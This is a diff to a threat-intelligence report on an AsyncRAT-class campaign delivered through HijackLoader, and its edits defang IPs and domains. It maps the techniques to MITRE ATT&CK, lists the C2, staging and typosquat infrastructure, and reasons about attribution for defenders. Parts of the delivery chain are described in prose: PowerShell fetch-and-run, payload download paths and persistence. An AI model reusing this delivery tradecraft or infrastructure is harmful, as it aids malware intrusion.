@@ -1382,7 +1382,7 @@ No AsyncRAT/zgRAT/DCRat SSL-certificate detections fired, because the TLS handsh
 | Tactic / Technique | Name | Evidence |
 |---|---|---|
 | Initial Access / T1566.001 | Spearphishing Attachment | Macro Office docs (`Price5.docm`, `Price6.doc`, `NDA.doc`, `Price4.xls`); NDA/Price lure themes |
-| Initial Access / T1566.002 | Spearphishing Link | `.url` shortcuts pointing to typosquats (`onedrive.to`, `microsoft.com-app.cc`); Mega.io URLs |
+| Initial Access / T1566.002 | Spearphishing Link | `.url` shortcuts pointing to typosquats (`onedrive[.]to`, `microsoft[.]com-app[.]cc`); Mega[.]io URLs |
 | Execution / T1204.002 | Malicious File | User must double-click `.scr`/`.msi`/`.exe`/`.lnk`/`.url`/`.msc` lures |
 | Execution / T1059.001 | PowerShell | Macro-decoded reverse-encoded URL → `iwr` → `start-process`; `Excel_2016_Windows.bat` `Set-ItemProperty` calls |
 | Execution / T1059.003 | Windows Command Shell | Tier-2 MSC chain `cmd.exe /c` invocations; `taskkill /IM mmc.exe /F` cleanup |
@@ -1417,11 +1417,11 @@ No AsyncRAT/zgRAT/DCRat SSL-certificate detections fired, because the TLS handsh
 | Discovery / T1083 | File and Directory Discovery | `GetEnvironmentVariableW` resolution of `%TEMP%`/`%APPDATA%`/`%PROGRAMDATA%`; `GetFileSize` + `ReadFile` on encrypted payloads |
 | Discovery / T1057 | Process Discovery | Stage-2 `ZwQuerySystemInformation` (anti-sandbox process enum); CrystSupervisor32's capability signatures include process enumeration (MODERATE) |
 | Collection / T1113 | Screen Capture | `CrystSupervisor32.exe` YARA `screenshot` match plus a capability-signature hit; pe_08 imports `BitBlt` + `GetDC` + `CreateCompatibleBitmap` (MODERATE) |
-| Command and Control / T1071.001 | Application Layer Protocol: Web Protocols | TLSv1.0 to `185.241.208.129:56167` from `WVault.exe`; 17 connections over 33 min 21s; pe_08 imports `WININET` (DEFINITE) |
+| Command and Control / T1071.001 | Application Layer Protocol: Web Protocols | TLSv1.0 to `185[.]241[.]208[.]129:56167` from `WVault.exe`; 17 connections over 33 min 21s; pe_08 imports `WININET` (DEFINITE) |
 | Command and Control / T1573.001 | Encrypted Channel: Symmetric Cryptography | TLSv1 ClientHello cipher list `49162-49161-49172-49171-53-47`; injected .NET RAT inside WVault.exe handles encryption |
 | Command and Control / T1571 | Non-Standard Port | TCP/56167 (not 443/80) for C2 (DEFINITE) |
 | Command and Control / T1090.002 | External Proxy | GoProxy MITM intent (CA cert install for HTTPS interception) (MODERATE) |
-| Command and Control / T1105 | Ingress Tool Transfer | Mega.io payload downloads (`/busket/putty.exe`, `/busket/putty2.exe`, `/busket/Bravo/vida/NGZTDICF.exe`); `109.120.137.6/PUTTY.exe`; `80.253.249.186:5504/<DLL>` |
+| Command and Control / T1105 | Ingress Tool Transfer | Mega[.]io payload downloads (`/busket/putty.exe`, `/busket/putty2.exe`, `/busket/Bravo/vida/NGZTDICF.exe`); `109[.]120[.]137[.]6/PUTTY.exe`; `80[.]253[.]249[.]186:5504/<DLL>` |
 
 ---
 
@@ -1431,13 +1431,13 @@ No AsyncRAT/zgRAT/DCRat SSL-certificate detections fired, because the TLS handsh
 
 > **Analyst note:** The campaign uses three different hosting providers for three different purposes, a primary staging server on a Russian-jurisdiction bulletproof host that has been formally sanctioned by the US Treasury, a C2 server on a Spamhaus DROP-listed bulletproof host in Poland, and a second-stage payload host in Germany. The deliberate dual-bulletproof-hosting selection, sanctioned AS210644 plus DROP-listed AS210558, is itself a signal about the operator's risk tolerance. They are willing to operate on infrastructure that the US Treasury and Spamhaus have publicly flagged. This rules out cautious operators or low-skill operators who would have moved to less-marked hosting after sanction announcements; it does not, by itself, attribute the campaign to any specific named actor.
 
-### 8.1 Staging Server: 62.60.237.100 (AEZA: OFAC sanctioned)
+### 8.1 Staging Server: 62[.]60[.]237[.]100 (AEZA: OFAC sanctioned)
 
-> **Analyst note:** This is the open directory that hosts the campaign's distribution kit (32+ artifacts, 8 delivery vectors). What's worth understanding for a defender is that the hosting AS (AS210644, AEZA Group LLC) was formally sanctioned by the US Treasury in July 2025 with a concurrent Five Eyes joint advisory. The Stage 1 sample first appeared on VirusTotal eight months *after* that sanctions designation, which means the operator stages on this infrastructure with full awareness of the OFAC designation. Routine network-perimeter rules at most defenders' organizations would already be blocking traffic to this AS by reputation policy; an explicit IP block on `62.60.237.100` is the operational backstop.
+> **Analyst note:** This is the open directory that hosts the campaign's distribution kit (32+ artifacts, 8 delivery vectors). What's worth understanding for a defender is that the hosting AS (AS210644, AEZA Group LLC) was formally sanctioned by the US Treasury in July 2025 with a concurrent Five Eyes joint advisory. The Stage 1 sample first appeared on VirusTotal eight months *after* that sanctions designation, which means the operator stages on this infrastructure with full awareness of the OFAC designation. Routine network-perimeter rules at most defenders' organizations would already be blocking traffic to this AS by reputation policy; an explicit IP block on `62[.]60[.]237[.]100` is the operational backstop.
 
 | Field | Value |
 |---|---|
-| IP | `62.60.237.100` |
+| IP | `62[.]60[.]237[.]100` |
 | Port | 80 |
 | Server banner | Apache/2.4.58 (Ubuntu) |
 | ASN | AS210644 |
@@ -1452,13 +1452,13 @@ The directory `/Documents/` (mirrored at `/download/Documents/`) is open and ind
 
 The sanctions context matters. AS210644 was sanctioned by the US Treasury Office of Foreign Assets Control on 1 July 2025, with a concurrent Five Eyes joint designation. Per Recorded Future Insikt Group, AS210644 carried 7.5% of Tier-1 C2 servers between July 2024 and July 2025. The Stage 1 sample first appeared on VirusTotal on 22 March 2026, eight months after the designation, so the operator is running on sanctioned infrastructure with full awareness of it.
 
-### 8.2 C2 Server: 185.241.208.129 (1337 Services: Spamhaus DROP)
+### 8.2 C2 Server: 185[.]241[.]208[.]129 (1337 Services: Spamhaus DROP)
 
 > **Analyst note:** This is the active C2 endpoint. Every infected host beacons here over TLSv1 on a non-standard high port (TCP/56167). The hosting AS, AS210558 (1337 Services GmbH, Poland), is on the Spamhaus DROP list of presumed-malicious infrastructure that legitimate networks publish-and-block by policy. VirusTotal also lists five sister sample binaries communicating with this same IP: `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe`. Hunt teams should add these as additional hash-based searches in their EDR telemetry; co-resident operator infrastructure on AS210558 is a useful pivot point even when the specific campaign attribution is uncertain.
 
 | Field | Value |
 |---|---|
-| IP | `185.241.208.129` |
+| IP | `185[.]241[.]208[.]129` |
 | Port | 56167 |
 | ASN | AS210558 |
 | ASN owner | 1337 Services GmbH |
@@ -1467,17 +1467,17 @@ The sanctions context matters. AS210644 was sanctioned by the US Treasury Office
 | Listing status | **Spamhaus DROP** |
 | Other community signals | DOJ Operation Talent domain seizure (StarkRDP/rdp.sh, January 2025); 1000+ community abuse reports across 200+ sources on the /24 |
 | VT communicating files | `Carriers.exe`, `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` |
-| Historical resolutions | Banking phishing infrastructure (`caisseregionale-agricole.com`, `securepay.ddns.net`, `paiementsecurise.ddns.net`, `securepay.life`, `netbillerdown.com`) |
+| Historical resolutions | Banking phishing infrastructure (`caisseregionale-agricole[.]com`, `securepay[.]ddns[.]net`, `paiementsecurise[.]ddns[.]net`, `securepay.life`, `netbillerdown[.]com`) |
 
 AS210558 is **Spamhaus DROP-listed**. Spamhaus DROP is a list of presumed-malicious infrastructure that legitimate networks publish-and-block by policy. The listing means routine network-perimeter rules at most defenders' organizations would already be blocking traffic to/from this IP regardless of campaign-specific detection.
 
 The IP recurs across three Hunters Ledger investigations (this campaign and two prior). This recurrence does not by itself attribute the campaigns to a single operator (AS210558 is shared bulletproof hosting and multiple operators may co-tenant) but it is consistent with operator overlap at MODERATE confidence (per the ACH analysis in Section 11).
 
-### 8.3 Second-Stage Payload Server: 109.120.137.6 (H2nexus)
+### 8.3 Second-Stage Payload Server: 109[.]120[.]137[.]6 (H2nexus)
 
 | Field | Value |
 |---|---|
-| IP | `109.120.137.6` |
+| IP | `109[.]120[.]137[.]6` |
 | ASN | AS215730 |
 | ASN owner | H2NEXUS LTD |
 | Country | Germany |
@@ -1486,45 +1486,45 @@ The IP recurs across three Hunters Ledger investigations (this campaign and two 
 | Russian-language artifact | Historical URL `mozhno-li-vyvesti-dengi-s-krakena.html` ("can-you-withdraw-money-from-Kraken") |
 | VT verdict | 6/91 malicious |
 
-The Russian-language Kraken-exchange URL on this IP is one of the strongest single Russian-speaking-operator language signals in the corpus. Combined with the VSEZBSRABOTAT.url filename and the Mega.io `busket/` typo, three independent first-language signals converge on Russian-speaking attribution at HIGH confidence (90%).
+The Russian-language Kraken-exchange URL on this IP is one of the strongest single Russian-speaking-operator language signals in the corpus. Combined with the VSEZBSRABOTAT.url filename and the Mega[.]io `busket/` typo, three independent first-language signals converge on Russian-speaking attribution at HIGH confidence (90%).
 
-### 8.4 Mega.io Cloud-Storage Abuse
+### 8.4 Mega[.]io Cloud-Storage Abuse
 
 | Field | Value |
 |---|---|
-| Service | `s3.g.s4.mega.io` |
+| Service | `s3[.]g[.]s4[.]mega[.]io` |
 | Operator bucket ID | `aileqac3yep7oqdhygjpberqqnk2zrnhck2lx` |
 | Operator subdir typo | `busket/` (typo of `bucket/`) |
 | Subfolders observed | `busket/`, `Bravo/vida/` |
 | Hosted payloads | `putty.exe`, `putty2.exe`, `Bravo/vida/NGZTDICF.exe` |
 | VT verdict | 13/60 malicious |
 
-Mega.io is a legitimate cloud-storage service. The operator's specific bucket is the abuse vector. The `busket/` typo (operator misspelling of `bucket/`) is a stable cross-vector fingerprint. It appears in every delivery vector that reaches Mega.io and has remained stable for 15+ months. The typo is a characteristic English-second-language error and is treated as a strong Russian-speaker tell.
+Mega[.]io is a legitimate cloud-storage service. The operator's specific bucket is the abuse vector. The `busket/` typo (operator misspelling of `bucket/`) is a stable cross-vector fingerprint. It appears in every delivery vector that reaches Mega[.]io and has remained stable for 15+ months. The typo is a characteristic English-second-language error and is treated as a strong Russian-speaker tell.
 
 ### 8.5 Co-Resolution: Four Typosquat Domains
 
-| Domain | First seen | Resolution to 62.60.237.100 |
+| Domain | First seen | Resolution to 62[.]60[.]237[.]100 |
 |---|---|---|
-| `onedrive.to` | 2025-12-20 | Active |
-| `microsoft.com-app.cc` | (per-campaign) | Active |
-| `www-microsoft.live` | 2025-10-03 | Historical (per VT pDNS) |
-| `www.onedrive.to` | (CNAME of `onedrive.to`) | Active |
+| `onedrive[.]to` | 2025-12-20 | Active |
+| `microsoft[.]com-app[.]cc` | (per-campaign) | Active |
+| `www-microsoft[.]live` | 2025-10-03 | Historical (per VT pDNS) |
+| `www[.]onedrive[.]to` | (CNAME of `onedrive[.]to`) | Active |
 
 Four typosquat domains co-resolving to a single staging IP is **DEFINITE single-operator infrastructure control**, the probability that four unrelated actors registered four typosquats and pointed them at the same IP is negligible. The infrastructure cluster supports the H1 attribution hypothesis (single distinct operator) over the H4 hypothesis (shared bulletproof tenancy of unrelated actors).
 
-### 8.6 Shared Wondershare-Pack Staging: 80.253.249.186
+### 8.6 Shared Wondershare-Pack Staging: 80[.]253[.]249[.]186
 
-> **Analyst note:** This IP serves the legitimate Wondershare DLL pack used as camouflage by multiple HijackLoader campaigns leveraging the Wondershare side-load template. It is not specific to <a href="/actors/UTA-2026-007/">UTA-2026-007</a>. It is shared infrastructure. Defenders observing connections to `80.253.249.186:5504/<DLL>` requests have a high-confidence indicator they are watching a Wondershare-side-load campaign, but not necessarily this specific operator. Use it as a pivot point that narrows the suspect set, not as a single-operator attribution signal.
+> **Analyst note:** This IP serves the legitimate Wondershare DLL pack used as camouflage by multiple HijackLoader campaigns leveraging the Wondershare side-load template. It is not specific to <a href="/actors/UTA-2026-007/">UTA-2026-007</a>. It is shared infrastructure. Defenders observing connections to `80[.]253[.]249[.]186:5504/<DLL>` requests have a high-confidence indicator they are watching a Wondershare-side-load campaign, but not necessarily this specific operator. Use it as a pivot point that narrows the suspect set, not as a single-operator attribution signal.
 
 | Field | Value |
 |---|---|
-| IP | `80.253.249.186` |
+| IP | `80[.]253[.]249[.]186` |
 | Port | 5504 |
 | ASN owner | QWINS LTD |
 | Country | Germany |
 | VT verdict | 11/47 malicious |
 
-This IP serves the legitimate Wondershare DLL pack (`BugSplat.dll`, `COMSupport.dll`, etc.) used by multiple campaigns leveraging the Wondershare side-load template. The shared-staging IP is useful as a pivot. Defenders observing connections to `80.253.249.186:5504/<DLL>` requests have a high-confidence indicator that they are watching a Wondershare-side-load campaign, but not necessarily this specific operator.
+This IP serves the legitimate Wondershare DLL pack (`BugSplat.dll`, `COMSupport.dll`, etc.) used by multiple campaigns leveraging the Wondershare side-load template. The shared-staging IP is useful as a pivot. Defenders observing connections to `80[.]253[.]249[.]186:5504/<DLL>` requests have a high-confidence indicator that they are watching a Wondershare-side-load campaign, but not necessarily this specific operator.
 
 ---
 
@@ -1616,9 +1616,9 @@ Defenders should assume a 43-second window from sample launch to first C2 beacon
 - Encrypted payloads: `%LocalAppData%\Temp\<8hex>.tmp` files referenced by per-host random env vars
 
 **Containment categories (one-line action labels):**
-- Block C2 IP `185.241.208.129` and JA3 `07af4aa9e4d215a5ee63f9a0a277fbe3` at network perimeter
-- Block staging IP `62.60.237.100` and second-stage IP `109.120.137.6` at network perimeter
-- Block typosquat domains (`onedrive.to`, `microsoft.com-app.cc`, `www-microsoft.live`) at DNS perimeter
+- Block C2 IP `185[.]241[.]208[.]129` and JA3 `07af4aa9e4d215a5ee63f9a0a277fbe3` at network perimeter
+- Block staging IP `62[.]60[.]237[.]100` and second-stage IP `109[.]120[.]137[.]6` at network perimeter
+- Block typosquat domains (`onedrive[.]to`, `microsoft[.]com-app[.]cc`, `www-microsoft[.]live`) at DNS perimeter
 - Hunt internal hosts for the persistence and registry artifacts above; isolate any matches
 - Rotate credentials for any user who interacted with the lure files (specifically: any browser-saved passwords, session cookies, OAuth refresh tokens, or banking session data, anything an AsyncRAT-class .NET RAT would have access to during the persistence window). Prioritize banking sessions and OAuth refresh tokens before browser-saved passwords. Session cookies and refresh tokens enable replay without additional steps; saved passwords require additional attacker effort if MFA is enforced.
 - Remove the GoProxy MITM CA cert from Trusted Root Certification Authorities store on any host where it appears
@@ -1653,8 +1653,8 @@ The language I use here (`weak indicators suggest`) reflects the LOW confidence 
 Four independent Russian-language artifacts converge:
 
 1. **`VSEZBSRABOTAT.url`**: Russian transliteration "vse zarabotat'" ("earn everything") in a `.url` filename. Operator-curated content, not auto-generated.
-2. **`mozhno-li-vyvesti-dengi-s-krakena.html`**: Russian "can-you-withdraw-money-from-Kraken" historical URL on second-stage IP `109.120.137.6`.
-3. **`busket/` Mega.io subdir typo**: operator misspelling of `bucket/`. Stable across all delivery vectors for 15+ months. Characteristic English-second-language tell.
+2. **`mozhno-li-vyvesti-dengi-s-krakena.html`**: Russian "can-you-withdraw-money-from-Kraken" historical URL on second-stage IP `109[.]120[.]137[.]6`.
+3. **`busket/` Mega[.]io subdir typo**: operator misspelling of `bucket/`. Stable across all delivery vectors for 15+ months. Characteristic English-second-language tell.
 4. **SPecialiST RePack YARA hit on `NDA.doc`**: `NDA.doc` was authored using the SPecialiST RePack Russian pirated Office authoring environment (per VT YARA match). This is an artifact of the operator's tooling, not lure content.
 
 These signals are independent and converge. Operator language attribution holds at HIGH confidence (90%) even where actor-identity attribution is LOW.
@@ -1663,7 +1663,7 @@ These signals are independent and converge. Operator language attribution holds 
 
 Four cross-vector fingerprints collectively rule out the H4 alternative hypothesis (coincidental shared bulletproof tenancy of unrelated actors):
 
-1. **`busket/` Mega.io subdir misspelling** stable across all 7 delivery vectors for 15+ months: operator-specific Russian-speaker ESL fingerprint.
+1. **`busket/` Mega[.]io subdir misspelling** stable across all 7 delivery vectors for 15+ months: operator-specific Russian-speaker ESL fingerprint.
 2. **`I:\CompanySource\Plowshare\…\ExceptionHandler.pdb` PDB path**: organized multi-project build environment, project codename Plowshare; suggests dedicated developer workflow rather than commodity-only consumption.
 3. **GoProxy MITM CA cert thumbprint `0174E68C97DDF1E0EEEA415EA336A163D2B61AFD`**: operator-specific tradecraft not in public HijackLoader reporting; represents an operator addition to the commodity loader chain.
 4. **Per-host KDF: `X65599(GetComputerNameW()) XOR 0xa1b2d3b4`** as a structural pattern: resists 270+ cipher recovery attempts; above commodity level.
@@ -1689,7 +1689,7 @@ Their role is MaaS customer, bundle-camouflage integrator and lure developer, an
 On sophistication the operator shows selective depth, high-tier work in chosen areas, multi-vendor camouflage, three-layer wrapping, a cross-campaign-novel hollow-host pattern, a per-host KDF, alongside commodity choices in others, a near-stock Inno Setup wrapper, a commodity HijackLoader loader, a commodity Rugmi.HP cert installer. That mix is more diagnostic than uniform high-tier work, because it shows what the operator prioritized and what they consciously skipped.
 
 **Operator codename lexicon (operator-curated identifiers):**
-`Penguish` (loader family), `cytotoxin` (LDKPOIZD PE OriginalFilename), `Apophyge` (Inno AppName, architectural term for column-base curve), `Veteran` (Inno DefaultDirName), `Plowshare` (operator project from PDB), `brokerbg` / `adv_ctrl` / `exttracer_net48` / `thread_adapter` / `Sulfathiazole` (persistence directory codenames), `Bravo/vida` (NDA campaign codename), AppId GUID `{1F2952E4-FC07-4482-B9E6-E795507DA7D2}`, Mega.io operator-typo subdir `busket/`.
+`Penguish` (loader family), `cytotoxin` (LDKPOIZD PE OriginalFilename), `Apophyge` (Inno AppName, architectural term for column-base curve), `Veteran` (Inno DefaultDirName), `Plowshare` (operator project from PDB), `brokerbg` / `adv_ctrl` / `exttracer_net48` / `thread_adapter` / `Sulfathiazole` (persistence directory codenames), `Bravo/vida` (NDA campaign codename), AppId GUID `{1F2952E4-FC07-4482-B9E6-E795507DA7D2}`, Mega[.]io operator-typo subdir `busket/`.
 
 <figure style="text-align: center; margin: 2em 0;">
   <img loading="lazy" src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-apophyge-installer-config.png" | relative_url }}" alt="Plain-text dump of the Inno Setup [Setup] section embedded in Carriers.exe. The lines AppName=Apophyge and DefaultDirName=Veteran are highlighted in green. Other configuration values visible: AppId={% raw %}{{1F2952E4-FC07-4482-B9E6-E795507DA7D2}}{% endraw %}, AppVersion=5.1, OutputBaseFilename=Carriers, Compression=lzma2, PrivilegesRequired=lowest, DisableDirPage=auto, DisableProgramGroupPage=auto, ChangesAssociations=no, ShowLanguageDialog=yes, WizardStyle=classic, WizardImageFile=embedded\\WizardImage0.png, WizardSmallImageFile=embedded\\WizardSmallImage0.png. Following the [Setup] block, [Files] entries list Source: '{tmp}\\BugSplat.dll' DestDir: '{tmp}' Flags: deleteafterinstall dontcopy, plus the same pattern for COMSupport.dll, CrystSupervisor32.exe, DBGHelp.dll, DVDSetting.dll, ExceptionHandler.dll.">
@@ -1711,7 +1711,7 @@ Their style is distinctive, uncommon English words mixed with technical-sounding
 | Code-similarity match to named-actor toolchain | Not completed |
 | GoProxy cert thumbprint cross-investigation linkage | Not found in other Hunters Ledger investigations |
 | Operator forum / dark-web identity | Not identified |
-| Full sister-sample analysis on shared C2 | Not completed (5 sister samples on `185.241.208.129` not fully triaged) |
+| Full sister-sample analysis on shared C2 | Not completed (5 sister samples on `185[.]241[.]208[.]129` not fully triaged) |
 
 If any of these gaps closes (especially code-similarity to a named actor or government attribution) the LOW confidence (58%) could rise to MODERATE or HIGH and the <a href="/actors/UTA-2026-007/">UTA-2026-007</a> designation could be retired in favor of the named actor.
 
@@ -1725,7 +1725,7 @@ The most operationally critical findings carry DEFINITE confidence; the outstand
 
 ### DEFINITE (Direct evidence, no ambiguity)
 
-- **C2 endpoint:** TLSv1 to `185.241.208.129:56167`, Suricata flow + behavioral sandbox TCP log + netstat samples (PID 2596 `WVault.exe`)
+- **C2 endpoint:** TLSv1 to `185[.]241[.]208[.]129:56167`, Suricata flow + behavioral sandbox TCP log + netstat samples (PID 2596 `WVault.exe`)
 - **JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3`**: captured by Suricata; matches SSLBL AsyncRAT JA3 list
 - **Spamhaus DROP listing** of AS210558: Suricata rule 2400036 fired during the run
 - **OFAC sanction** of AS210644 (AEZA GROUP LLC): US Treasury SDN list, July 2025
@@ -1743,7 +1743,7 @@ The most operationally critical findings carry DEFINITE confidence; the outstand
 
 - **Family identification: HijackLoader / Penguish / Rugmi / GhostPulse / IDAT Loader**: Kaspersky `Trojan.Win32.Penguish.gun`, Microsoft `TrojanDownloader:Win64/Rugmi.HNL!MTB`, Elastic `Windows_Trojan_GhostPulse_caea316b` YARA: three independent vendor classifications (~92% confidence)
 - **Final-stage family is AsyncRAT-class .NET RAT**: three independent VT IDS hits on the SSL handshake (`AsyncRAT/zgRAT SSL cert`, `DCRat SSL cert`, `AsyncRAT JA3`) plus `clr.dll!CreateAssemblyNameObject` thread start address in `WVault.exe`: variant inconclusive (88% confidence)
-- **Russian-speaking operator**: four independent first-language artifacts: `VSEZBSRABOTAT.url` filename, `mozhno-li-vyvesti-dengi-s-krakena.html` URL, `busket/` Mega.io subdir typo, SPecialiST RePack YARA hit (90% confidence)
+- **Russian-speaking operator**: four independent first-language artifacts: `VSEZBSRABOTAT.url` filename, `mozhno-li-vyvesti-dengi-s-krakena.html` URL, `busket/` Mega[.]io subdir typo, SPecialiST RePack YARA hit (90% confidence)
 - **`WVault.exe` is renamed Qihoo 360 PromoUtil.exe with .NET injection**: PDB path matches; build-time string matches; `clr.dll!CreateAssemblyNameObject` thread; orphaned process pattern (95% confidence)
 - **Reflective loader `FUN_100024B0` in `ExceptionHandler.dll`**: PEB-walk API hash resolution + relocation step + memcpy + jump
 - **Stage-2 shellcode 8-phase architecture**: API hash table at offsets `+0x14` through `+0x13c`; X65599 hash multiplier; anti-sandbox quadruple
@@ -1785,7 +1785,7 @@ The most operationally critical findings carry DEFINITE confidence; the outstand
 Eight questions cover the most common operational concerns raised by this campaign. Each answer cross-references the primary evidence section.
 
 **Q1. Is my organization affected by this campaign?**
-Check whether any host has connected to `185.241.208.129:56167` over TCP, or any process has produced a TLS ClientHello matching JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` (Section 6.7). Either signal is high-confidence evidence of infection. Hunt also for the persistence artifacts in Section 10.4 (the `watchermgmt` scheduled task in legacy `.job` format and the registry artifacts listed there). These are durable and survive process restarts.
+Check whether any host has connected to `185[.]241[.]208[.]129:56167` over TCP, or any process has produced a TLS ClientHello matching JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` (Section 6.7). Either signal is high-confidence evidence of infection. Hunt also for the persistence artifacts in Section 10.4 (the `watchermgmt` scheduled task in legacy `.job` format and the registry artifacts listed there). These are durable and survive process restarts.
 
 **Q2. What confidence level is the attribution?**
 Three levels apply, with different confidence values (Section 11): the operator is Russian-speaking at HIGH confidence (90%); this is a distinct operator (not coincidental shared bulletproof tenancy) at MODERATE confidence (75%); the operator can be tracked as a single entity across the corpus at LOW confidence (58%). No link to any publicly named actor (TAG-150 / GrayBravo, TA544 / Narwhal Spider, etc.) has been established. Both candidates were ruled out at INSUFFICIENT confidence.
@@ -1794,10 +1794,10 @@ Three levels apply, with different confidence values (Section 11): the operator 
 "UTA" stands for Unattributed Threat Actor. <a href="/actors/UTA-2026-007/">UTA-2026-007</a> is an internal Hunters Ledger tracking designation used because no link to a publicly named threat group could be established (Section 11.1 explanatory blockquote). It is specific to this publication. It will not appear in external threat intelligence feeds or vendor reports. If future evidence links this activity to a known named actor, the designation will be retired.
 
 **Q4. What if my SOC sees the JA3 hash `07af4aa9e4d215a5ee63f9a0a277fbe3` on a live host?**
-Treat this as a high-priority alert regardless of the specific campaign attribution. The JA3 fingerprint is on the Abuse.ch SSLBL list as an AsyncRAT-class indicator, and an active TLS handshake with this fingerprint indicates a .NET RAT actively beaconing from an infected host (Section 6.7). Verify the C2 destination IP and port, isolate the host from the network, and proceed with the artifacts in Section 10.4. If the destination IP/ASN matches `185.241.208.129` / AS210558, this is specifically <a href="/actors/UTA-2026-007/">UTA-2026-007</a>. If the JA3 matches but the destination IP differs, the campaign is a different AsyncRAT-class operator. Treat the alert as equally high-priority because the same RAT class is active.
+Treat this as a high-priority alert regardless of the specific campaign attribution. The JA3 fingerprint is on the Abuse.ch SSLBL list as an AsyncRAT-class indicator, and an active TLS handshake with this fingerprint indicates a .NET RAT actively beaconing from an infected host (Section 6.7). Verify the C2 destination IP and port, isolate the host from the network, and proceed with the artifacts in Section 10.4. If the destination IP/ASN matches `185[.]241[.]208[.]129` / AS210558, this is specifically <a href="/actors/UTA-2026-007/">UTA-2026-007</a>. If the JA3 matches but the destination IP differs, the campaign is a different AsyncRAT-class operator. Treat the alert as equally high-priority because the same RAT class is active.
 
 **Q5. Will my DNS-based detection stack catch this campaign?**
-No. The C2 IP `185.241.208.129` is hardcoded in the loader/payload and never queried via DNS (Section 6.8: 49 DNS queries observed in the run, none point to operator infrastructure). DNS sinkholes, RPZ rules, and DGA-detection techniques will not catch this campaign. Detection must be IP-based, JA3-based, or behavioral.
+No. The C2 IP `185[.]241[.]208[.]129` is hardcoded in the loader/payload and never queried via DNS (Section 6.8: 49 DNS queries observed in the run, none point to operator infrastructure). DNS sinkholes, RPZ rules, and DGA-detection techniques will not catch this campaign. Detection must be IP-based, JA3-based, or behavioral.
 
 **Q6. What is the time-to-detect window?**
 ~43 seconds from sample launch to first C2 beacon (Section 6.1 timing chain). File-based blocking (AV, gateway scan) must act within this window or behavioral detection at the orphan-`WVault.exe` stage is required. SIEM/EDR latency exceeding ~60 seconds is too slow for prevention; only detection-and-response is feasible at that latency.
@@ -1844,14 +1844,14 @@ These gaps and assumptions do not block publication. The story is coherent: HIGH
 3. **GoProxy CA cert install was not directly observed during behavioral sandbox analysis**: VT C2AE confirms the technique; dynamic analysis did not trigger it.
 4. **`WVault.exe` drop hash divergence**: bundle hash `ca9f859f…` vs runtime drop `c085a724…`. Possible explanations include a slightly different version selected at runtime, operator post-extraction modification, or one hash misread. Confidence in the divergence is HIGH; confidence in the underlying cause is INSUFFICIENT.
 5. **`pe_06` invocation mechanism**: process tree shows `Carriers.exe → Carriers.tmp → CrystSupervisor32.exe → ...` but does not show `pe_06`. The most likely explanation (per static analysis of the `_tiny_erase_` export pattern) is that `pe_06` is loaded as a DLL into one of the existing processes, confidence MODERATE.
-6. **Sister samples on `185.241.208.129`**: `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` are sister samples; further triage could confirm campaign clustering and/or expand the <a href="/actors/UTA-2026-007/">UTA-2026-007</a> footprint.
+6. **Sister samples on `185[.]241[.]208[.]129`**: `Gdkmos.exe`, `KioskWindows_1.04.zip`, `detectrdps.exe`, `SSA-Statement.exe`, `Rjdfz.exe` are sister samples; further triage could confirm campaign clustering and/or expand the <a href="/actors/UTA-2026-007/">UTA-2026-007</a> footprint.
 7. **GoProxy cert thumbprint `0174E68C97DDF1E0EEEA415EA336A163D2B61AFD` cross-campaign linkage**: not yet found in other Hunters Ledger investigations; would be a high-value cross-campaign linkage if observed.
 
 ### 15.2 Working assumptions
 
 The following assumptions underpin the analysis and are explicit so a future analyst can challenge them:
 
-1. **C2 endpoint primacy**: The C2 endpoint observed at investigation time (`185.241.208.129:56167`) is treated as the operator's primary C2. No failover infrastructure or DGA-style C2 rotation was observed; a backup C2 channel not triggered during the 5-minute behavioral sandbox window cannot be ruled out.
+1. **C2 endpoint primacy**: The C2 endpoint observed at investigation time (`185[.]241[.]208[.]129:56167`) is treated as the operator's primary C2. No failover infrastructure or DGA-style C2 rotation was observed; a backup C2 channel not triggered during the 5-minute behavioral sandbox window cannot be ruled out.
 2. **Single-operator interpretation of cross-vector fingerprints**: The four cross-vector fingerprints (`busket/` typo, Plowshare PDB, GoProxy cert thumbprint, per-host KDF) are treated as evidence for a single operator at MODERATE confidence (75%). Coincidental shared bulletproof tenancy is the alternative hypothesis, evaluated and judged less plausible because the `busket/` typo is stable across all 7 vectors for 15+ months.
 3. **Dynamic-static congruence on cipher gap**: The static analysis of `pe_03`'s API resolution and KDF code path is treated as broadly correct (HIGH confidence); the dynamic invalidation of the env var algorithm at MODERATE confidence indicates a single missing element (rand-consume order, alphabet, RNG, hash function, OR seed source) rather than a fundamentally different algorithm. This assumption is testable with interactive debugger attach to a live `pe_03`.
 4. **Final-stage family is AsyncRAT-class**: The convergence of three independent VT IDS rule hits (AsyncRAT JA3, AsyncRAT/zgRAT SSL cert, DCRat C&C SSL cert) plus `clr.dll` thread evidence is treated as sufficient to commit to the AsyncRAT-class designation at HIGH confidence (88%). Specific variant within the class (AsyncRAT vs DCRat vs zgRAT vs VenomRAT) is left INSUFFICIENT.
